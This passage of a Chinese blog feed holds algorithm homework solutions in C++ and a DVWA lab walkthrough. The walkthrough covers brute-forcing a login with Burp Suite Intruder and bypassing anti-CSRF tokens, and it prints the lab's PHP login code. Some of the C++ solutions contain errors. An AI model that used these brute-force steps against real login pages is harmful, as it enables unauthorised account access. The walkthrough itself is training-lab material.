      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（二）]]></title>
    <url>%2F2019%2F10%2F23%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C2%2F</url>
    <content type="text"><![CDATA[算法实验二。 问题 A: 最长公共子序列题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=是序列X=的一个子序列，Z中的元素在X中的下标序列为。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 样例输入abcfbc abfcab programming contest abcd mnp 样例输出4 2 0 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; /*void LCSlength(int m,int n,char *x,char *y,int c[105][105],int b[105][105]) { int i,j; for(i=1;i&lt;=m;i++) c[i][0]=0; for(i=1;i&lt;=n;i++) c[0][i]=0; for(i=1;i&lt;=m;i++) { for(j=1;j&lt;=n;j++) { if(x[i]==y[i]) { c[i][j]=c[i-1][j-1]+1; b[i][j]=1; } else if(c[i-1][j]&gt;=c[i][j-1]) { c[i][j]=c[i-1][j]; b[i][j]=2; } else { c[i][j]=c[i][j-1]; b[i][j]=3; } } } } */ int main() { char x[105],y[105]; int c[105][105]; while(cin&gt;&gt;x+1) { cin&gt;&gt;y+1; int m=strlen(x+1); int n=strlen(y+1); for(int i=0;i&lt;=m;i++) c[0][i]=0; for(int i=0;i&lt;=n;i++) c[i][0]=0; /*for(int i=0;i&lt;=105;i++) { for(int j=0;j&lt;=105;j++) { c[i][j]=0; b[i][j]=0; } }*/ for(int i=1;i&lt;=m;i++) { for(int j=1;j&lt;=n;j++) { if(x[i]==y[j]) c[i][j]=c[i-1][j-1]+1; else c[i][j]=max(c[i-1][j],c[i][j-1]); } } //cout&lt;&lt;x+1&lt;&lt;y+1&lt;&lt;endl; //cout&lt;&lt;m&lt;&lt;n&lt;&lt;endl; cout&lt;&lt;c[m][n]&lt;&lt;endl; } return 0; } 问题 B: 矩阵连乘题目描述给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。 输入输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。 输出对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。 数据保证结果不超过1e9。 样例输入3 2 A 10 100 B 5 50 C 100 5 ACB ABC 样例输出7500 MengMengDa 提示代码#include&lt;iostream&gt; #include&lt;string.h&gt; using namespace std; int m[105][105]={0}; int p[200]; int maxchain(int n) { for(int i=1;i&lt;=n;i++) { m[i][i]=0; } for(int r=2;r&lt;=n;r++) { for(int i=1;i&lt;=n-r+1;i++) { int j=i+r-1; m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j]; for(int k=i+1;k&lt;j;k++) { int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; if(t&lt;m[i][j]) { m[i][j]=t; } } } } return m[1][n]; } int main() { int n,m; while(cin&gt;&gt;n&gt;&gt;m) { char chain[30]; int h[30]; int l[30]; for(int i=0;i&lt;n;i++) { cin&gt;&gt;chain[i]&gt;&gt;h[i]&gt;&gt;l[i]; } char test[3][105]; for(int i=0;i&lt;m;i++) { cin&gt;&gt;test[i]; } int key; for(int i=0;i&lt;m;i++) { for(int j=0;j&lt;n;j++) { if(test[i][0]==chain[j]) { key=j; break; } } p[0]=h[key]; p[1]=l[key]; int len=strlen(test[i]); int flag=1; for(int k=1;k&lt;len;k++) { for(int j=0;j&lt;n;j++) { if(test[i][k]==chain[j]) { key=j; break; } } if(p[k]==h[key]) { p[k+1]=l[key]; } else { cout&lt;&lt;&quot;MengMengDa&quot;&lt;&lt;endl; flag=0; break; } } if(flag==1) { cout&lt;&lt;maxchain(len)&lt;&lt;endl; } } } } 问题 C: 01背包问题题目描述已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。 接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围） 输出对每组测试数据，输出其对应的所装物品的最大价值。 样例输入1 10 5 2 6 2 3 6 5 5 4 4 6 样例输出15 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { long long w[10010],v[10010],dp[10010]; int t,m,n; cin&gt;&gt;t; while(t--) { cin&gt;&gt;m&gt;&gt;n; for(int i=1;i&lt;=n;i++) { cin&gt;&gt;w[i]&gt;&gt;v[i]; } memset(dp,0,sizeof(dp)); for(int i=1;i&lt;=n;i++) { for(int j=m;j&gt;=w[i];j--) { dp[j]=max(dp[j],dp[j-w[i]]+v[i]); } } for(int i=m;i&gt;=2;i--) { if(dp[i]!=dp[i-1]) { cout&lt;&lt;dp[i]&lt;&lt;endl; break; } } } return 0; } 问题 D: 最大子段和题目描述给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。 每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。 接下来一行有n个数x(-1000&lt;=x&lt;=1000)。 输出输出其对应的最大子段和。 样例输入1 6 2 -11 4 13 -1 2 样例输出18 提示子段可为空集，答案为0 代码#include&lt;bits/stdc++.h&gt; using namespace std; int a[10010]; int sum=0; int maxsum(int n) { int b=0; for(int i=0;i&lt;n;i++) { if(b&gt;0) { b+=a[i]; } else { b=a[i]; } if(b&gt;sum) { sum=b; } } } int main() { int t; cin&gt;&gt;t; while(t--) { int k; cin&gt;&gt;k; for(int i=0;i&lt;k;i++) { cin&gt;&gt;a[i]; } maxsum(k); cout&lt;&lt;sum&lt;&lt;endl; } return 0; } 问题 E: 汽水瓶【25】题目描述有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？ 输入输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。 输出对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0 样例输入3 10 81 0 样例输出1 5 40 提示代码#include&lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; using namespace std; int main(){ int n,sum=0; while(cin&gt;&gt;n&amp;&amp;n!=0){ sum=0; while(n&gt;2){ sum+=n/3; n=(n%3)+(n/3); } if(n==2) sum++; cout&lt;&lt;sum&lt;&lt;endl; } } 🚩推荐阅读算法实验考试算法实验作业算法实验（四）python-algorithmpython必会算法推荐检查回文数]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-Brute_Force暴力破解]]></title>
    <url>%2F2019%2F10%2F22%2FBrute_Force%2F</url>
    <content type="text"><![CDATA[利用burpsuite暴力破解DVWA的Brute_Force。 级别：low一、配置burpsuite打开火狐浏览器，工具栏里找到preferences,找到network proxy,点击settings,填写如下配置 ~`KHUGAWJ8ZXHWWKAC``3~S.png DH136K_XS4P1DIU_UWK7_R5.png 打开burpsuite,勾选代理即可 2KIR_2_A1X2TVG54_Z_@C96.png 先关闭proxy里的intercept，先不拦截 二、寻找注入点先进入DVWA页面，安全等级设置位low,再进入暴力破解的页面 C0_0_CWB_ISDUO_RCNCS45I.png 输入用户名 admin 密码 123 开启burp suite拦截，登陆 H_HLQGD19_DF_ODPW_@385T.png 选中全部内容，右键发送给intruder 2Y19__1WHZ__RQM@9K__BLX.png 点clear清除全部变量，选中123，点add，添加变量 O@P_AL@_P1IU`E~MU5A7X_Q.png 在payloads里添加破解字典 0EA__K`9T_QD_WXGC7_1_@S.png 下面就可以攻击了 burp suite的攻击类型 5C`_M8L_Q_D_X_AT_`___@J.png 第一种：Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种：Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种：Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种：Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 三、攻击选择sniper攻击方式，开始攻击 根据攻击结果的length来判断是否成功 R_OTHC_P6_X_`_ZWAN_O_`I.png 攻击成功，密码为password 此法适用各个安全等级 之前说法有误，此法并不适合各个等级 级别：mediumBrute Force Source&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; medium加了错误密码延迟，low级别的方法还是适用，就是花费时间更长 级别：highBrute Force Source&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 加了 user_token 一个随机值，来防止用户多次提交 抓包，选择Pitchfork攻击类型，添加爆破的参数 Qm0Bb8.png options中选择单线程 Qm022n.png Options中找到Rediections模块，选择always，允许重定向 在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token 在Payloads中为选择的参数设置字典 QmBrsx.png 开始攻击 QmBcdO.png]]></content>
      <categories>
        <category>暴力破解</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（一）]]></title>
    <url>%2F2019%2F10%2F22%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C1%2F</url>
    <content type="text"><![CDATA[算法实验一。 问题 A: 判断字符串是否是手机号码题目描述手机号码是一串数字，长度为11位，并且第一位必须是1，现在给出一个字符串，我们需要判断这个字符串是否符合手机格式。 输入多组测试数据。每组数据输入一个字符串。 输出若该字符串符合手机号码格式，输出1，否则输出0。 样例输入12345612345 样例输出1 提示代码#include&lt;iostream&gt; #include&lt;string&gt; using namespace std; int main() { string s; while(cin&gt;&gt;s) { int b=1; if(s[0]!=&#39;1&#39;||s.length()!=11) b=0; for(int i=0;i&lt;s.length();i++) { if(s[i]&lt;&#39;0&#39;||s[i]&gt;&#39;9&#39;) b=0; } cout&lt;&lt;b&lt;&lt;endl; } } 问题 B: 内部收益率题目描述 img 输入 img 输出对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。 样例输入1 -1 2 2 -8 6 9 0 样例输出1.00 0.50 提示代码#include&lt;iostream&gt; #include&lt;iomanip&gt; using namespace std; int main() { double cf[15]; int T; double l,r,s,f,m; while(cin&gt;&gt;T&amp;&amp;T!=0) { for(int i=0;i&lt;=T;i++) { cin&gt;&gt;cf[i]; } l=-1.0; r=1e8; for(int i=0;i&lt;100;i++) { s=0; f=1.0; m=(l+r)/2; for(int j=1;j&lt;=T;j++) { f=f/(1.0+m); s=s+cf[j]*f; } if(s+cf[0]&gt;0) l=m; else r=m; } cout&lt;&lt;setprecision(2)&lt;&lt;std::fixed&lt;&lt;m&lt;&lt;endl; } } 问题 C: 跳台阶题目描述一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 输入多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100) 输出每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量. 所得到的结果模1000000007 样例输入3 4 样例输出3 5 提示代码#include&lt;iostream&gt; using namespace std; long long m=1000000007; /*int f(int n) { if(n&lt;=1) return 1; else return (f(n-1)%m+f(n-2)%m)%m; } */ long long f(int n) { long long f1=1; long long f2=2; long long t=0; if(n==1) { return 1; } else if(n==2) { return 2; } else { for(int i=3;i&lt;=n;i++) { t=((f1%m)+(f2%m))%m; f1=f2; f2=t; } return t; } } int main() { int n; while(cin&gt;&gt;n) { cout&lt;&lt;f(n)&lt;&lt;endl; } } 问题 D: 奶牛的聚会题目描述农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。 输入第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。 对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。 输出对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。 样例输入1 5 0.9 2 1.4 4 3.1 1 6.2 1 8.3 2 样例输出Case #1: 300 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; int inf = 0x3f3f3f3f; int n; double w[500005]; double s[500005]; double f(double x) { double sum=0; for(int i=0;i&lt;n;i++) { double d=abs(s[i]-x); sum+=d*d*d*w[i]; } return sum; } int main() { int Ca; double l,r; double e=1e-6; cin&gt;&gt;Ca; //double s[50005]; //int w[50005]; for(int k=1;k&lt;=Ca;k++) { //int n; cin&gt;&gt;n; l=inf; r=-inf; for(int i=0;i&lt;n;i++) { cin&gt;&gt;s[i]; cin&gt;&gt;w[i]; l=min(l,s[i]); r=max(r,s[i]); } while(r-l&gt;e) { double m1=(l+r)/2; double m2=(m1+r)/2; if(f(m1)&gt;f(m2)) l=m1; else r=m2; } cout&lt;&lt;&quot;Case #&quot;&lt;&lt;k&lt;&lt;&quot;: &quot;&lt;&lt;ll(f(l)+0.5)&lt;&lt;endl; } } 问题 E: 光合作用题目描述蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？ img 输入第一行输入一个整数 T，表示测试数据的组数。 每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。 接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。 输出对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。 样例输入2 7 1 2 4 4 4 1 1 2 3 4 样例输出0 0 1 2 1 0 0 1 1 1 1 提示这题后来进行了几次重测，请同学们不要惊慌 代码#include&lt;iostream&gt; #include&lt;cmath&gt; using namespace std; int main() { int T; int mo[100005]; cin&gt;&gt;T; while(T--) { int n,m,h; cin&gt;&gt;n&gt;&gt;m&gt;&gt;h; for(int i=1;i&lt;=m;i++) { cin&gt;&gt;mo[i]; } for(int i=1;i&lt;=n;i++) { int min=1e5; for(int j=1;j&lt;=m;j++) { if(abs(mo[j]-i)&lt;min) min=abs(mo[j]-i); } if((h-min)&lt;=0) cout&lt;&lt;0&lt;&lt;endl; else cout&lt;&lt;(h-min)&lt;&lt;endl; } } } 🚩推荐阅读算法实验考试算法实验作业算法实验（四）python-algorithmpython必会算法推荐检查回文数]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法作业（二）]]></title>
    <url>%2F2019%2F10%2F21%2F%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A2%2F</url>
    <content type="text"><![CDATA[算法作业二。 问题 A: 单词排序题目描述小红学会了很多英文单词，妈妈为了帮小红加强记忆，拿出纸、笔，把 N 个单词写在纸上的一行里，小红看了几秒钟后，将这张纸扣在桌子上。妈妈问小红：“你能否将这 N 个单词按照字典排列的顺序，从小到大写出来？”小红按照妈妈的要求写出了答案。现在请你编写程序帮助妈妈检查小红的答案是否正确。注意：所有单词都由小写字母组成，单词两两之间用一个空格分隔。 输入输入包含两行。 第一行仅包括一个正整数N(0&lt;N≤26)。 第二行包含N个单词，表示妈妈写出的单词，两两之间用一个空格分隔。 单个单词长度不超过1010。 输出输出仅有一行。针对妈妈写出的单词，按照字典排列的顺序从小到大排列成一行的结果，每个单词后带一个空格。 样例输入4 city boy tree student 样例输出boy city student tree 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { string s[30]; int n; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) { cin&gt;&gt;s[i]; } sort(s,s+n); for(int i=0;i&lt;n;i++) { if(i==0) cout&lt;&lt;s[i]; else cout&lt;&lt;&quot; &quot;&lt;&lt;s[i]; } cout&lt;&lt;endl; return 0; } 问题 B: 求数组的最长递减子序列题目描述给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。 输入输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。 输出输出最长递减子序列，数字之间有一个空格。 样例输入8 9 4 3 2 5 4 3 2 样例输出9 5 4 3 2 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int n; int a[1010],b[1010],p[1010]; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) { cin&gt;&gt;a[i]; } memset(b,1,sizeof(b)); memset(p,-1,sizeof(p)); for(int i=1;i&lt;n;i++) { for(int j=0;j&lt;i;j++) { if(a[i]&lt;a[j]&amp;&amp;(b[j]+1)&gt;b[i]) { b[i]=b[j]+1; p[i]=j; } } } int maxn=0,num=0; for(int i=0;i&lt;n;i++) { if(b[i]&gt;maxn) { maxn=b[i]; num=i; } } stack &lt;int&gt;stk; stk.push(a[num]); while(p[num]!=-1) { stk.push(a[p[num]]); num=p[num]; } while(!stk.empty()) { cout&lt;&lt;stk.top()&lt;&lt;&quot; &quot;; stk.pop(); } return 0; } 问题 C: 矩形滑雪场题目描述zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。 输入第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。 输出仅一行:输出1个整数，表示可以滑行的最大长度。 样例输入5 5 1 2 3 4 5 16 17 18 19 6 15 24 25 20 7 14 23 22 21 8 13 12 11 10 9 样例输出25 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int m,n; int dp[40400]; struct node { int h,x,y; }ai[40040]; bool compare(node a,node b) { return a.h&lt;b.h; } bool check(node a,node b) { if(((a.x==b.x&amp;&amp;abs(a.y-b.y)==1)||(a.y==b.y&amp;&amp;abs(a.x-b.x)==1))&amp;&amp;b.h&gt;a.h) return true; return false; } int main() { int num=0; cin&gt;&gt;m&gt;&gt;n; for(int i=1;i&lt;=m;i++) { for(int j=1;j&lt;=n;j++) { cin&gt;&gt;ai[num].h; ai[num].x=i; ai[num].y=j; num++; } } sort(ai,ai+m*n,compare); int mmax=1; for(int i=0;i&lt;num;i++) { dp[i]=1; for(int j=0;j&lt;i;j++) { if(check(ai[j],ai[i])) { dp[i]=max(dp[i],dp[j]+1); } } if(dp[i]&gt;mmax) mmax=dp[i]; } cout&lt;&lt;mmax&lt;&lt;endl; return 0; } 问题 D: Homework题目描述临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。 暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。 I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。 现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。 输入测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。 输出对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位 提示：float 的精度可能不够，你应该使用 double 类型。 样例输入4 20 4 10 5 22 10 3 1 2 0 0 样例输出37.00 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int m,n; int a[20],b[20]; double ma[20]; while(cin&gt;&gt;m&gt;&gt;n&amp;&amp;m!=0&amp;&amp;n!=0) { double maxn=0; for(int i=0;i&lt;m;i++) { cin&gt;&gt;a[i]; cin&gt;&gt;b[i]; ma[i]=double(b[i])/a[i]; } int f=0; int s; double vm; while(1) { if(f==m) break; vm=0; for(int i=0;i&lt;m;i++) { if(ma[i]&gt;vm) { vm=ma[i]; s=i; } } if(n&lt;a[s]) { maxn=maxn+n*ma[s]; break; } else { maxn=maxn+b[s]; n=n-a[s]; ma[s]=0; f++; } } cout&lt;&lt;setprecision(2)&lt;&lt;std::fixed&lt;&lt;maxn&lt;&lt;endl; } } 问题 E: 区间包含问题题目描述已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。 输入输入包含多组测试数据，对于每组测试数据： 第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。 接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) 。 接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) 。 输出对于每组测试数据，输出 m 行，每行包含一个整数。 数据过大请使用快速输入输出。 样例输入4 3 1 3 2 4 1 4 1 2 1 2 1 3 1 4 样例输出1 1 2 提示代码#include&lt;iostream&gt; #include&lt;algorithm&gt; #define inf 0x7fffffff using namespace std; typedef struct node { int l; int r; }node; bool cmp(node a, node b) { return a.r &lt; b.r; } int main() { std::ios::sync_with_stdio(false); int n, m; while (cin &gt;&gt; n &gt;&gt; m) { node *nnum = new node[n]; node *mnum = new node[m]; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; nnum[i].l &gt;&gt; nnum[i].r; } for (int i = 0; i &lt; m; i++) { cin &gt;&gt; mnum[i].l &gt;&gt; mnum[i].r; } sort(nnum, nnum + n, cmp); for (int i = 0; i &lt; m; i++) { int res = 0; int k = mnum[i].l; //K初始的时候等于m数组的左边界 for (int j = 0; j &lt; n; j++) { if ((nnum[j].l &gt;= k)) { if (nnum[j].r &lt;= mnum[i].r) { res++; k = nnum[j].r; //每次更新成n数组的右边界 } else //右边界一旦超过，直接扔掉后面的部分结束质询 { break; } } } cout &lt;&lt; res &lt;&lt; endl; } delete[] nnum; delete[] mnum; } } 问题 F: 最长子序列题目描述在一个数组中找出和最大的连续几个数。（至少包含一个数） 例如： 数组A[] = [-2,1,-3,4,-1,2,1,-5,4]，则连续的子序列[4,-1,2,1]有最大的和6. 输入第一行输入一个不超过1000的整数n。 第二行输入n个整数A[i]。 